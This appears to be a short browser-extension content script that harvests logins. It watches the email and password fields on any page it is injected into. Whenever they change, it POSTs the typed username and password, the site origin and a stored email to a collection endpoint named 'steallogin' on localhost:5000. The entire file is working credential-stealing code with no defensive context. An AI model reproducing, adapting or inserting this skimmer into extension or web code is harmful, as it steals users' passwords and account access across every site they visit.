
var email = $('[type="email"]');
var password = $('[type="password"]');

email.change(function () {

    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        $.post("http://localhost:5000/steallogin", {
            email: userEmail,
            url: window.location.origin,
            username: email.val(),
            password: password.val()
        });
    });
});

password.change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        $.post("http://localhost:5000/steallogin", {
            email: userEmail,
            url: window.location.origin,
            username: email.val(),
            password: password.val()
        });
    });
});